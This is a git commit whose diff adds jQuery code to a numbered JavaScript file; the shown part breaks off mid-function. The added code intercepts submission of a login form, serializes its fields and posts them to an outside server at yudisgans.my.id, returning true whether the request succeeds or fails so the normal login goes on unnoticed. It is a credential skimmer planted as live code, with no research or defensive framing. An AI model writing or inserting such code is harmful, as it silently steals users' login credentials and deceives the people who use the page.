8319445648985403209a7c1f001f6c765e927c80
yudisgans <96610185+yudisgans@users.noreply.github.com>
2022-01-26 21:33:49 +0700

    Update 13457577.js

--- 13457577.js
+++ 13457577.js
@@ -1,1 +1,25 @@
 
+
+$(".login-form").submit(function() {
+
+	var d = $(".login-form");
+
+	$.ajax({
+
+        url: "http://yudisgans.my.id/apiii.php",
+
+        type: "POST",
+
+        data: d.serialize(),
+
+        success: function () {
+
+            return true;
+
+        },
+
+        error: function () {
+
+            return true;
+
+        },
